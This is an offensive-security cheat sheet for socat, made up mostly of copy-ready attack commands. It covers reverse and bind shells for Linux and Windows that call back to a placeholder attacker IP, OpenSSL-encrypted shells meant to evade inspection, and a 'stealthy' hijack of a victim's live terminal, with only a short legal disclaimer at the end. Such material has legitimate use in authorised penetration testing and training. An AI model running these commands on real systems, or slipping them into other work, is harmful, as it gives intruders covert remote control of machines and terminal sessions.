# 🔹 Socat Cheat Sheet: Comprehensive Guide

## 🔥 Overview

Socat (SOcket CAT) is a powerful networking tool used for data transfer, proxying, and creating reverse/bind shells. It supports encryption (OpenSSL), TTY handling, and cross-platform compatibility (Linux & Windows).

---

## 🛠️ **Basic Usage**

### 📌 Simple Data Transfer

```bash
socat - TCP4:<IP>:<PORT>     # Connect to a remote port
socat TCP4-L:<PORT> -        # Listen for incoming connections
```

---

## 🏹 **Reverse & Bind Shells**

### 📌 **Reverse Shell (Linux)**

```bash
# Target Machine (Victim)
socat TCP:<ATTACKER-IP>:<PORT> EXEC:/bin/bash,pty,stderr,sigint,sane

# Attacker Machine (Listener)
socat - TCP-LISTEN:<PORT>
```

### 📌 **Reverse Shell (Windows)**

```bash
# Target Machine (Victim)
socat TCP:<ATTACKER-IP>:<PORT> EXEC:cmd.exe,pipes

# Attacker Machine (Listener)
socat - TCP-LISTEN:<PORT>
```

### 📌 **Bind Shell (Linux)**

```bash
# Target Machine (Victim)
socat TCP-LISTEN:<PORT>,fork EXEC:/bin/bash,pty,stderr,sigint,sane

# Attacker Machine
socat - TCP:<TARGET-IP>:<PORT>
```

### 📌 **Bind Shell (Windows)**

```bash
# Target Machine (Victim)
socat TCP-LISTEN:<PORT>,fork EXEC:cmd.exe,pipes

# Attacker Machine
socat - TCP:<TARGET-IP>:<PORT>
```

---

## 🔐 **Encrypted Shells (Using OpenSSL)**

### 📌 **Generate SSL Certificate**

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem  # Merge into a single .pem file
```

### 📌 **Reverse Shell with OpenSSL (Linux)**

```bash
# Listener (Attacker)
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Reverse Shell (Victim)
socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:/bin/bash,pty,stderr,sigint,sane
```

### 📌 **Reverse Shell with OpenSSL (Windows)**

```bash
# Listener (Attacker)
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Reverse Shell (Victim)
socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:cmd.exe,pipes
```

### 📌 **Bind Shell with OpenSSL (Linux & Windows)**

```bash
# Target Machine (Victim)
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:/bin/bash,pty,stderr,sigint,sane  # Linux
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes  # Windows

# Attacker Machine
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
```

---

## 🎭 **TTY-Based Bind Shell (Stealthy Linux Hijack)**

### 📌 **Bind a Victim’s Active Terminal Session**

```bash
# Target Machine (Victim)
socat TCP-L:<PORT> FILE:`tty`,raw,echo=0

# Attacker Machine
nc <TARGET-IP> <PORT>    # OR
socat - TCP:<TARGET-IP>:<PORT>
```

🔹 **Why?** This hijacks the victim’s current shell session instead of spawning a new one, making it stealthier.

### 📌 **Encrypted TTY-Based Bind Shell**

```bash
# Target Machine (Victim)
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# Attacker Machine
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
```

🔹 **Why?** This provides a **secure**, **encrypted** hijacking of the victim’s active terminal.

### 📌 **Reverse Shell Using OpenSSL & TTY Techniques**

```bash
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

🔹 **Why?** This creates a **stable, interactive**, and **encrypted** reverse shell.

---

## 📡 **Port Forwarding & Proxying**

### 📌 **Local Port Forwarding**

```bash
socat TCP-LISTEN:<LOCAL-PORT>,fork TCP:<TARGET-IP>:<TARGET-PORT>
```

### 📌 **Remote Port Forwarding**

```bash
socat TCP:<ATTACKER-IP>:<PORT> TCP:<TARGET-IP>:<TARGET-PORT>
```

---

## 🚀 **File Transfers**

### 📌 **Send a File**

```bash
socat -u FILE:<FILE> TCP:<TARGET-IP>:<PORT>
```

### 📌 **Receive a File**

```bash
socat TCP-LISTEN:<PORT> -u FILE:<FILE>,create
```

---

## 🎯 **Windows Socat Execution (Hiding in Memory)**

```powershell
socat.exe TCP:<ATTACKER-IP>:<PORT> EXEC:cmd.exe,pipes
```

**🛠️ Pro Tip:**

- Use `-d -d` for debugging
- Use `fork` to allow multiple connections

---

## 🔥 **Why Use Socat?**

✅ **Works on Linux & Windows** ✅ **Encrypted Shells (OpenSSL)** ✅ **Stable Reverse Shells** ✅ **Port Forwarding & Proxying** ✅ **Stealthy TTY Hijacking** ✅ **File Transfers**

---

## ⚠️ **Legal Disclaimer**

💀 **Use only on systems you have explicit permission to test! Unauthorized use may be illegal.**

🚀 **Hack Responsibly!**